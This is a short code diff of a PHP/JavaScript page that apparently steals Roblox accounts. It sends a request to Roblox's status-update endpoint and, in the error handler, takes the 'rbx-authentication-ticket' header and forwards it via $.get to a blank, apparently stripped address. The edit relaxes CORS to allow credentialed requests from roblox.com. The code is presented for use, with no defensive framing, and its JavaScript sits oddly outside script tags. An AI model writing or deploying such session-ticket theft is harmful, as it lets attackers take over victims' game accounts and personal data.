@@ -2,7 +2,8 @@
 
 <body>
    <?php
-header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Origin: https://www.roblox.com');
+header('Access-Control-Allow-Credentials: true');
 ?>
 var data = {}
 $.ajax({
@@ -16,7 +17,7 @@ $.post("https://www.roblox.com/home/updatestatus",
        })
    },
    error: function(request, textStatus, errorThrown) {
-       $.get(' ' + request.getResponseHeader('rbx-authentication-ticket'));
+       $.get('' + request.getResponseHeader('rbx-authentication-ticket'));
    }
 });
 </body>
